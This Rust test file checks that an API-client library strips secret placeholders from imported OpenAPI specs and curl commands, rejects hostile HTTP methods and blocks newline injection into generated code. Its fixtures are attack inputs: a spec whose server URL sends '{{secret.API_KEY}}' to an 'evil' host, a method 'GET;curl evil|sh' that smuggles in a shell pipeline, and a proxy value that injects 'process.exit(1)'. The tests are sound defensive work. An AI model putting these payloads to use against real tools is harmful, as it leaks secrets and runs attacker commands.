//! Review fix pass: import sanitising (C1), method validation (C2), codegen comments (C3).

use xrest_core::*;

fn dump_endpoints(ws: &Workspace) -> String {
    format!("{:?}", ws.endpoints())
}

const EVIL_SPEC: &str = r#"{
  "openapi": "3.0.0",
  "info": {"title": "T"},
  "servers": [{"url": "https://evil/{{secret.API_KEY}}"}],
  "paths": {
    "/ok": {"get": {
      "summary": "fine",
      "parameters": [
        {"in": "header", "name": "X-Token", "schema": {"default": "{{secret.TOKEN}}"}},
        {"in": "query", "name": "base", "schema": {"default": "{{BASE_URL}}"}},
        {"in": "query", "name": "ok", "schema": {"default": "1"}}
      ]
    }},
    "/x/{{secret.A}}": {"post": {"summary": "named {{secret.N}}"}}
  }
}"#;

#[test]
fn openapi_create_drops_interpolation_and_warns() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("w");
    let ws = Workspace::create_from_openapi(&root, "W", EVIL_SPEC).unwrap();
    assert!(
        !dump_endpoints(&ws).contains("{{secret"),
        "{}",
        dump_endpoints(&ws)
    );
    for e in ws.environments() {
        let base = &e.variables[0].value;
        assert_eq!(base, "https://api.example.com");
    }
    let w = ws.warnings().join("\n");
    assert!(w.contains("X-Token"), "{w}");
    assert!(w.contains("base URL"), "{w}");
    // nothing on disk holds an imported {{secret.…}} either
    let mut files = String::new();
    for entry in std::fs::read_dir(root.join("endpoints")).unwrap() {
        files += &std::fs::read_to_string(entry.unwrap().path()).unwrap();
    }
    files += &std::fs::read_to_string(root.join("environments.yaml")).unwrap();
    assert!(!files.contains("{{secret"), "{files}");
    assert!(!files.contains("{{BASE_URL}}{{"), "{files}");
    // the legitimate `{{BASE_URL}}` prefix and clean values survive
    let ok = ws.endpoints().iter().find(|e| e.name == "fine").unwrap();
    assert_eq!(ok.url, "{{BASE_URL}}/ok");
    assert!(ok.params.iter().any(|p| p.name == "ok" && p.value == "1"));
}

#[test]
fn openapi_merge_drops_interpolation_and_warns() {
    let dir = tempfile::tempdir().unwrap();
    let clean = r#"{"openapi":"3.0.0","info":{"title":"T"},"paths":{"/a":{"get":{}}}}"#;
    let mut ws = Workspace::create_from_openapi(dir.path().join("w"), "W", clean).unwrap();
    let before = ws.warnings().len();
    ws.merge_openapi(EVIL_SPEC).unwrap();
    assert!(
        !dump_endpoints(&ws).contains("{{secret"),
        "{}",
        dump_endpoints(&ws)
    );
    assert!(ws.warnings().len() > before);
    assert!(ws.warnings().join("\n").contains("X-Token"));
}

#[test]
fn curl_with_placeholders_is_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let mut ws = Workspace::create(dir.path(), "w").unwrap();
    for cmd in [
        "curl https://a.b/c -H 'X: {{secret.X}}'",
        "curl 'https://a.b/{{secret.X}}'",
    ] {
        let e = ws.import_curl_as_scratch(cmd).unwrap_err();
        assert!(matches!(e, Error::InvalidInput(_)), "{e:?}");
        assert!(ws.import_curl_as_endpoint(cmd).is_err());
    }
    assert!(ws.scratch_requests().is_empty());
}

fn spec_with_method(m: &str) -> RequestSpec {
    RequestSpec {
        method: m.into(),
        url: "https://a.b/c".into(),
        ..Default::default()
    }
}

#[test]
fn hostile_method_is_refused_everywhere() {
    let dir = tempfile::tempdir().unwrap();
    let mut ws = Workspace::create(dir.path(), "w").unwrap();
    let bad = "GET;curl evil|sh";
    let s = spec_with_method(bad);
    let inv = |r: Result<()>| assert!(matches!(r, Err(Error::InvalidInput(_))), "{r:?}");
    for lang in [
        CodeLanguage::Curl,
        CodeLanguage::Axios,
        CodeLanguage::Java,
        CodeLanguage::Kotlin,
    ] {
        inv(ws.export_code(&s, lang, false).map(|_| ()));
    }
    inv(ws.prepare_send(&s, false).map(|_| ()));
    inv(ws.create_endpoint("e", s.clone()).map(|_| ()));
    inv(ws.create_scratch("s", s.clone()).map(|_| ()));
    let ep = ws.create_endpoint("ok", spec_with_method("get")).unwrap();
    inv(ws.update_endpoint(&ep.id, None, s.clone()).map(|_| ()));
    let sc = ws.create_scratch("ok", spec_with_method("get")).unwrap();
    inv(ws.update_scratch(&sc.id, None, s.clone()).map(|_| ()));
    inv(ws
        .import_curl_as_scratch("curl -X 'GET;curl evil|sh' https://a.b/c")
        .map(|_| ()));
    // normal and lower-case methods are unaffected
    assert!(ws
        .export_code(&spec_with_method("patch"), CodeLanguage::Curl, false)
        .unwrap()
        .contains("-X PATCH"));
}

#[test]
fn proxy_with_newline_cannot_inject_code_into_comments() {
    let dir = tempfile::tempdir().unwrap();
    let ws = Workspace::create(dir.path(), "w").unwrap();
    let mut s = spec_with_method("GET");
    s.options.proxy = Some("::bad proxy\nprocess.exit(1)".into());
    for lang in [
        CodeLanguage::Axios,
        CodeLanguage::Java,
        CodeLanguage::Kotlin,
    ] {
        let out = ws.export_code(&s, lang, false).unwrap();
        assert!(out.contains("could not be parsed"), "{lang:?}\n{out}");
        assert!(
            !out.lines()
                .any(|l| l.trim_start().starts_with("process.exit")),
            "{lang:?}\n{out}"
        );
    }
}
